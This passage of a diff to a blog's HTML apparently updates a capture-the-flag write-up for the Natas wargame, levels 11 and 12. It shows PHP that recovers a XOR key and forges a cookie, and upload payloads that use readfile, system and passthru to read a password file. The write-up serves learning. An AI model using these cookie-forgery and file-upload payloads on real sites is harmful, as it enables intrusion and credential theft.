+        $data&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; = $_REQUEST&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;;
+    }
+}
+saveData($data);
+&lt;span class="nt"&gt;&amp;lt;form&amp;gt;&lt;/span&gt;
+Background color: &lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;bgcolor&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?=&lt;/span&gt;&lt;span class="nv"&gt;$data&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;bgcolor&amp;#39;&lt;/span&gt;&lt;span class="err"&gt;]&lt;/span&gt;&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;submit&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Set color&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Since we know the plaintext, given by the variable &lt;em&gt;$defaultdata&lt;/em&gt;, all we need is the value in the cookie. With that, we can XOR them and get our password.&lt;/p&gt;
 &lt;p&gt;We can use the plugin I described before, &lt;a href="http://www.editthiscookie.com/start/"&gt;edit this cookie&lt;/a&gt;, to get this value:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Now, we write the following script in PHP, modifying the XOR function to take our input:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;?&lt;/span&gt;&lt;span class="nx"&gt;php&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;lt;?&lt;/span&gt;&lt;span class="nx"&gt;php&lt;/span&gt;
 &lt;span class="nx"&gt;$cookie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;base64_decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
 &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;xor_encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$in&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
     &lt;span class="nx"&gt;$text&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$in&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
@@ -323,7 +321,7 @@ Output:
     &lt;span class="nx"&gt;$outText&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 
     &lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nx"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$text&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="nx"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-        &lt;span class="nx"&gt;$outText&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$text&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;$i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="nx"&gt;$key&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="nx"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$key&lt;/span&gt;&lt;span class="p"&gt;)];&lt;/span&gt;
+        &lt;span class="nx"&gt;$outText&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$text&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="nx"&gt;$key&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="nx"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
     &lt;span class="p"&gt;}&lt;/span&gt;
     &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;$outText&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;
@@ -333,7 +331,7 @@ Output:
 
 
 &lt;p&gt;Running it returns the XOR key that encrypts the &lt;em&gt;$defaultdata&lt;/em&gt; variable:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ php xor.php
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;php xor.php
 qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
 &lt;/pre&gt;&lt;/div&gt;
 
@@ -341,14 +339,14 @@ qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
 &lt;p&gt;The repeated pattern is obviously a key.&lt;/p&gt;
 &lt;p&gt;The next step is to modify the value of that variable to have &lt;em&gt;showpassword&lt;/em&gt; saying &lt;em&gt;yes&lt;/em&gt;. Then this should be XORerd with the right key in &lt;em&gt;$key&lt;/em&gt;.&lt;/p&gt;
 &lt;p&gt;For that, we created the following script:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;?&lt;/span&gt;&lt;span class="nx"&gt;php&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;lt;?&lt;/span&gt;&lt;span class="nx"&gt;php&lt;/span&gt;
 &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;xor_encrypt_mod&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;
     &lt;span class="nx"&gt;$text&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;json_encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;array&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;showpassword&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;yes&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;bgcolor&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;#ffffff&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
     &lt;span class="nx"&gt;$key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;qw8J&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
     &lt;span class="nx"&gt;$outText&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 
     &lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="nx"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$text&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="nx"&gt;$i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-        &lt;span class="nx"&gt;$outText&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$text&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;$i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="nx"&gt;$key&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="nx"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$key&lt;/span&gt;&lt;span class="p"&gt;)];&lt;/span&gt;
+        &lt;span class="nx"&gt;$outText&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$text&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="nx"&gt;$key&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="nx"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
     &lt;span class="p"&gt;}&lt;/span&gt;
     &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;$outText&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;
@@ -360,14 +358,14 @@ qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
 &lt;p&gt;This results in the code we need to add to the cookie. We do this through the plugin. Refreshing the page returns our password.&lt;/p&gt;
 &lt;h3&gt;Level 12: File Inclusion Attack&lt;/h3&gt;
 &lt;p&gt;This challenge starts with a JPG file uploader:
-&lt;img alt="" src="http://i.imgur.com/xcSJ5kr.png"&gt;&lt;/p&gt;
+&lt;img alt="" src="http://i.imgur.com/xcSJ5kr.png" /&gt;&lt;/p&gt;
 &lt;p&gt;Inspecting the source code, we see that the first function returns a random string of length 10:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;genRandomString() {&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;genRandomString&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
     &lt;span class="nx"&gt;$length&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
     &lt;span class="nx"&gt;$characters&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;0123456789abcdefghijklmnopqrstuvwxyz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
     &lt;span class="nx"&gt;$string&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
     &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;$p&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="nx"&gt;$length&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nx"&gt;$p&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
-        &lt;span class="nx"&gt;$string&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$characters&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mt_rand&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$characters&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)];&lt;/span&gt;
+        &lt;span class="nx"&gt;$string&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$characters&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;mt_rand&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$characters&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
     &lt;span class="p"&gt;}&lt;/span&gt;
     &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;$string&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;span class="p"&gt;}&lt;/span&gt;
@@ -375,7 +373,7 @@ qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
 
 
 &lt;p&gt;This string is used as the name of the uploaded file in the server:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;makeRandomPath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;$ext&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;makeRandomPath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$dir&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;$ext&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
     &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
     &lt;span class="nx"&gt;$path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$dir&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;genRandomString&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;$ext&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
     &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;file_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;$path&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
@@ -389,9 +387,9 @@ qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
 
 
 &lt;p&gt;However, this file's extension is given by the browser:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;&amp;lt;form&lt;/span&gt; &lt;span class="na"&gt;enctype=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;multipart/form-data&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;action=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;method=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nt"&gt;&amp;lt;form&lt;/span&gt; &lt;span class="na"&gt;enctype=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;multipart/form-data&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;action=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;method=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;POST&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;MAX_FILE_SIZE&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1000&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
-&lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;filename&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?&lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="nx"&gt;genRandomString&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="s"&gt;.jpg&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
+&lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;filename&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;lt;? print genRandomString(); ?&amp;gt;.jpg&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
 Choose a JPEG to upload (max 1KB):&lt;span class="nt"&gt;&amp;lt;br/&amp;gt;&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;uploadedfile&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;file&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&amp;lt;br&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;submit&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Upload File&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;/&amp;gt;&lt;/span&gt;
@@ -400,12 +398,12 @@ Choose a JPEG to upload (max 1KB):&lt;span class="nt"&gt;&amp;lt;br/&amp;gt;&lt;
 
 
 &lt;p&gt;Finally, the last function performs the file uploading. Notice that the code does not check whether the file is actually a JPG file:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;if(array_key_exists(&amp;quot;filename&amp;quot;, $_POST)) {
-    $target_path = makeRandomPathFromFilename(&amp;quot;upload&amp;quot;, $_POST[&amp;quot;filename&amp;quot;]);
-        if(filesize($_FILES[&amp;#39;uploadedfile&amp;#39;][&amp;#39;tmp_name&amp;#39;]) &amp;gt; 1000) {
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;array_key_exists&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;filename&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+    &lt;span class="nv"&gt;$target_path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;makeRandomPathFromFilename&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;upload&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nv"&gt;$_POST&lt;/span&gt;&lt;span class="err"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;filename&amp;quot;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;);
+        if(filesize($_FILES&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;uploadedfile&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;) &amp;gt; 1000) {
         echo &amp;quot;File is too big&amp;quot;;
     } else {
-        if(move_uploaded_file($_FILES[&amp;#39;uploadedfile&amp;#39;][&amp;#39;tmp_name&amp;#39;], $target_path)) {
+        if(move_uploaded_file($_FILES&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;uploadedfile&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;][&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;, $target_path)) {
             echo &amp;quot;The file &lt;span class="nt"&gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;\&amp;quot;$target_path\&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;$target_path&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt; has been uploaded&amp;quot;;
         } else{
             echo &amp;quot;There was an error uploading the file, please try again!&amp;quot;;
@@ -421,21 +419,21 @@ Choose a JPEG to upload (max 1KB):&lt;span class="nt"&gt;&amp;lt;br/&amp;gt;&lt;
 &lt;p&gt;Since the file extension is changed to &lt;em&gt;jpg&lt;/em&gt; in the browser side, we have control of this,  we can easly tamper the POST data.&lt;/p&gt;
 &lt;p&gt;Fist, let's think about the exploit we want to send to the server. Since we know that the server runs PHP, we have several possibilities in this language!&lt;/p&gt;
 &lt;p&gt;How about the following script which uses the function &lt;a href="http://php.net/manual/en/function.readfile.php"&gt;readfile()&lt;/a&gt;?&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
 &lt;span class="nb"&gt;readfile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/etc/natas_webpass/natas13&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
 &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;We could also use a &lt;a href="http://php.net/manual/en/function.system.php"&gt;system&lt;/a&gt; command:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
 &lt;span class="nb"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;cat /etc/natas_webpass/natas13&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
 &lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Or we could even use &lt;a href="http://php.net/manual/en/function.passthru.php"&gt;passthru&lt;/a&gt; again:&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt; &lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="x"&gt; &lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
